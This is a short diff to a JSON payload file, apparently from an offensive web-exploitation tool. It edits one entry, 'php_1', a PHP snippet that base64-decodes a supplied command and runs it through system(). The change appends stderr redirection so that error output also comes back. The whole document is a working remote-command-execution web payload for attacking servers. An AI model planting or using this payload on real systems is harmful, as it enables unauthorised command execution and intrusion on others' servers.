@@ -1,7 +1,7 @@
 {
 	"payloads": [{
 			"name": "php_1",
-			"payload": "<? echo system(base64_decode('{command}')); ?>"
+			"payload": "<? echo system(base64_decode('{command}').' 2>&1'); ?>"
 		}]
 
 }
